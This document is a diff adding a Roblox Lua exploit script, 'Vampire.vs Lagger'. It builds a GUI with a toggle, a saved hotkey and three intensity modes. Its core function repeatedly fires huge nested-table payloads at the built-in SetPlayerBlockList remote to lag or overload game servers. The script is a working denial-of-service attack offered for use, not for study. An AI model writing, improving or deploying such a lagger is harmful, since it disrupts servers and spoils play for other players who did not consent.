@@ -1,0 +1,308 @@
+-- remade by prince
+
+local UserInputService = game:GetService("UserInputService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+
+local config = {
+    nestingDepth = 2.5,
+    spamCount = 1,
+    cooldown = 0.15
+}
+
+local remotePath = "RobloxReplicatedStorage.SetPlayerBlockList"
+local isActive = false
+local hotkey = nil
+local screenGui = Instance.new("ScreenGui")
+
+screenGui.Name = "VampireLaggerGui"
+screenGui.ResetOnSpawn = false
+screenGui.Parent = PlayerGui
+
+for _, child in pairs(PlayerGui:GetChildren()) do
+    if child.Name == "VampireLaggerGui" and child ~= screenGui then
+        child:Destroy()
+    end
+end
+
+local mainFrame = Instance.new("Frame")
+mainFrame.Name = "MainFrame"
+mainFrame.Size = UDim2.new(0, 245, 0, 116)
+mainFrame.Position = UDim2.new(0.5, -122.5, 0.5, -58)
+mainFrame.BackgroundColor3 = Color3.fromRGB(235, 0, 135)
+mainFrame.BackgroundTransparency = 0
+mainFrame.BorderSizePixel = 0
+mainFrame.Active = true
+mainFrame.Draggable = true
+mainFrame.ClipsDescendants = true
+mainFrame.Parent = screenGui
+
+local frameCorner = Instance.new("UICorner")
+frameCorner.CornerRadius = UDim.new(0, 10)
+frameCorner.Parent = mainFrame
+
+local frameStroke = Instance.new("UIStroke")
+frameStroke.Color = Color3.fromRGB(255, 20, 150)
+frameStroke.Thickness = 2
+frameStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+frameStroke.Parent = mainFrame
+
+local topBar = Instance.new("Frame")
+topBar.Name = "TitleBar"
+topBar.Size = UDim2.new(1, 0, 0, 28)
+topBar.BackgroundTransparency = 1
+topBar.ZIndex = 5
+topBar.Parent = mainFrame
+
+local titleText = Instance.new("TextLabel")
+titleText.Size = UDim2.new(0.6, 0, 1, 0)
+titleText.Position = UDim2.new(0, 10, 0, 0)
+titleText.BackgroundTransparency = 1
+titleText.Text = "Vampire.vs Lagger"
+titleText.TextColor3 = Color3.fromRGB(255, 255, 255)
+titleText.TextSize = 11
+titleText.Font = Enum.Font.GothamBold
+titleText.TextXAlignment = Enum.TextXAlignment.Left
+titleText.ZIndex = 6
+titleText.Parent = topBar
+
+local statusText = Instance.new("TextLabel")
+statusText.Size = UDim2.new(0.4, 0, 1, 0)
+statusText.Position = UDim2.new(0.6, 0, 0, 0)
+statusText.BackgroundTransparency = 1
+statusText.Text = "OFF"
+statusText.TextColor3 = Color3.fromRGB(255, 100, 100)
+statusText.TextSize = 9
+statusText.Font = Enum.Font.GothamBold
+statusText.TextXAlignment = Enum.TextXAlignment.Right
+statusText.ZIndex = 6
+statusText.Parent = topBar
+
+local separatorLine = Instance.new("Frame")
+separatorLine.Size = UDim2.new(1, -16, 0, 1)
+separatorLine.Position = UDim2.new(0, 8, 0, 28)
+separatorLine.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+separatorLine.BackgroundTransparency = 0.3
+separatorLine.BorderSizePixel = 0
+separatorLine.ZIndex = 5
+separatorLine.Parent = mainFrame
+
+local toggleButton = Instance.new("TextButton")
+toggleButton.Size = UDim2.new(1, -16, 0, 30)
+toggleButton.Position = UDim2.new(0, 8, 0, 34)
+toggleButton.BackgroundColor3 = Color3.fromRGB(245, 0, 145)
+toggleButton.BackgroundTransparency = 0
+toggleButton.BorderSizePixel = 0
+toggleButton.AutoButtonColor = false
+toggleButton.Text = ""
+toggleButton.ZIndex = 5
+toggleButton.Parent = mainFrame
+
+local toggleCorner = Instance.new("UICorner")
+toggleCorner.CornerRadius = UDim.new(0, 8)
+toggleCorner.Parent = toggleButton
+
+local toggleStroke = Instance.new("UIStroke")
+toggleStroke.Color = Color3.fromRGB(255, 255, 255)
+toggleStroke.Thickness = 1
+toggleStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+toggleStroke.Parent = toggleButton
+
+local keybindButton = Instance.new("TextButton")
+keybindButton.Size = UDim2.new(0, 25, 0, 25)
+keybindButton.Position = UDim2.new(0, 5, 0.5, -12.5)
+keybindButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+keybindButton.BackgroundTransparency = 1
+keybindButton.Text = "V"
+keybindButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+keybindButton.Font = Enum.Font.GothamBold
+keybindButton.TextSize = 12
+keybindButton.BorderSizePixel = 0
+keybindButton.ZIndex = 7
+keybindButton.Parent = toggleButton
+
+local keybindCorner = Instance.new("UICorner")
+keybindCorner.CornerRadius = UDim.new(0, 10)
+keybindCorner.Parent = keybindButton
+
+local keybindStroke = Instance.new("UIStroke")
+keybindStroke.Color = Color3.fromRGB(255, 255, 255)
+keybindStroke.Thickness = 1
+keybindStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+keybindStroke.Parent = keybindButton
+
+local labelText = Instance.new("TextLabel")
+labelText.Size = UDim2.new(0.55, 0, 1, 0)
+labelText.Position = UDim2.new(0, 37, 0, 0)
+labelText.BackgroundTransparency = 1
+labelText.Text = "Lagger"
+labelText.TextColor3 = Color3.fromRGB(255, 255, 255)
+labelText.Font = Enum.Font.GothamBold
+labelText.TextSize = 10
+labelText.TextXAlignment = Enum.TextXAlignment.Left
+labelText.ZIndex = 7
+labelText.Parent = toggleButton
+
+local modeNames = {"Low", "Mid", "High"}
+local modeButtons = {}
+local modeFrame = Instance.new("Frame")
+modeFrame.Size = UDim2.new(1, -16, 0, 24)
+modeFrame.Position = UDim2.new(0, 8, 0, 70)
+modeFrame.BackgroundTransparency = 1
+modeFrame.ZIndex = 5
+modeFrame.Parent = mainFrame
+
+for i, name in ipairs(modeNames) do
+    local modeBtn = Instance.new("TextButton")
+    modeBtn.Size = UDim2.new(0.327, 0, 1, 0)
+    modeBtn.Position = UDim2.new((i-1) * 0.34, 0, 0, 0)
+    modeBtn.BackgroundColor3 = Color3.fromRGB(225, 0, 125)
+    modeBtn.BackgroundTransparency = 0
+    modeBtn.Text = name
+    modeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    modeBtn.Font = Enum.Font.GothamBold
+    modeBtn.TextSize = 10
+    modeBtn.BorderSizePixel = 0
+    modeBtn.ZIndex = 6
+    modeBtn.Parent = modeFrame
+
+    local mCorner = Instance.new("UICorner")
+    mCorner.CornerRadius = UDim.new(0, 5)
+    mCorner.Parent = modeBtn
+
+    local mStroke = Instance.new("UIStroke")
+    mStroke.Color = Color3.fromRGB(255, 20, 150)
+    mStroke.Thickness = 1.5
+    mStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+    mStroke.Parent = modeBtn
+
+    modeBtn.MouseButton1Click:Connect(function()
+        for _, btn in ipairs(modeButtons) do
+            btn.BackgroundColor3 = Color3.fromRGB(225, 0, 125)
+            local stroke = btn:FindFirstChildOfClass("UIStroke")
+            if stroke then stroke.Color = Color3.fromRGB(255, 20, 150) end
+        end
+        
+        local selectedStroke = modeBtn:FindFirstChildOfClass("UIStroke")
+        if selectedStroke then selectedStroke.Color = Color3.fromRGB(255, 255, 255) end
+        
+        if name == "Low" then
+            config.nestingDepth, config.spamCount, config.cooldown = 1.5, 1, 0.25
+        elseif name == "Mid" then
+            config.nestingDepth, config.spamCount, config.cooldown = 2.5, 1, 0.15
+        elseif name == "High" then
+            config.nestingDepth, config.spamCount, config.cooldown = 4, 2, 0.08
+        end
+    end)
+
+    table.insert(modeButtons, modeBtn)
+end
+
+local defaultStroke = modeButtons[2]:FindFirstChildOfClass("UIStroke")
+if defaultStroke then defaultStroke.Color = Color3.fromRGB(255, 255, 255) end
+
+local savePath = "VampireLagger_Keybind.txt"
+local function loadKeybind()
+    local success, data = pcall(readfile, savePath)
+    if success and data and data ~= "" then
+        for _, code in pairs(Enum.KeyCode:GetEnumItems()) do
+            if code.Name == data then
+                hotkey = code
+                keybindButton.Text = code.Name:sub(1,1)
+                break
+            end
+        end
+    end
+end
+
+local function saveKeybind(key)
+    hotkey = key
+    keybindButton.Text = key.Name:sub(1,1)
+    pcall(writefile, savePath, key.Name)
+end
+loadKeybind()
+
+local function resolvePath(path)
+    if not path or path == "" then return nil end
+    local current = game
+    local cleanPath = path:gsub("^game%.", "")
+    for segment in cleanPath:gmatch("[^%.]+") do
+        if current then current = current[segment] else return nil end
+    end
+    return current
+end
+
+local function executeSpam(depth, iterations)
+    local mainTable = {}
+    local nested = {}
+    table.insert(nested, {})
+    local pointer = nested[1]
+    for _ = 1, depth do
+        local newTable = {}
+        table.insert(pointer, newTable)
+        pointer = newTable
+    end
+    for _ = 1, 2250 do
+        table.insert(mainTable, nested)
+    end
+    local remote = resolvePath(remotePath)
+    if remote then
+        for _ = 1, iterations do
+            pcall(function()
+                if remote:IsA("RemoteEvent") or remote:IsA("UnreliableRemoteEvent") then
+                    remote:FireServer(mainTable)
+                elseif remote:IsA("RemoteFunction") then
+                    remote:InvokeServer(mainTable)
+                end
+            end)
+        end
+    end
+end
+
+local function runLoop()
+    while isActive do
+        task.spawn(function() executeSpam(config.nestingDepth, config.spamCount) end)
+        task.wait(config.cooldown)
+    end
+end
+
+local function setEnabled(state)
+    isActive = state
+    if isActive then
+        toggleButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+        toggleStroke.Color = Color3.fromRGB(0, 0, 0)
+        statusText.Text = "ON"
+        statusText.TextColor3 = Color3.fromRGB(100, 255, 100)
+        task.spawn(runLoop)
+    else
+        toggleButton.BackgroundColor3 = Color3.fromRGB(225, 0, 125)
+        toggleStroke.Color = Color3.fromRGB(0, 0, 0)
+        statusText.Text = "OFF"
+        statusText.TextColor3 = Color3.fromRGB(255, 100, 100)
+    end
+end
+
+toggleButton.MouseButton1Click:Connect(function()
+    setEnabled(not isActive)
+end)
+
+local isBinding = false
+keybindButton.MouseButton1Click:Connect(function()
+    isBinding = true
+    keybindButton.Text = "..."
+end)
+
+UserInputService.InputBegan:Connect(function(input, processed)
+    if processed then return end
+    if input.KeyCode == Enum.KeyCode.LeftControl then
+        mainFrame.Visible = not mainFrame.Visible
+        return
+    end
+    if isBinding and input.UserInputType == Enum.UserInputType.Keyboard then
+        saveKeybind(input.KeyCode)
+        isBinding = false
+    elseif hotkey and input.KeyCode == hotkey then
+        setEnabled(not isActive)
+    end
+end)
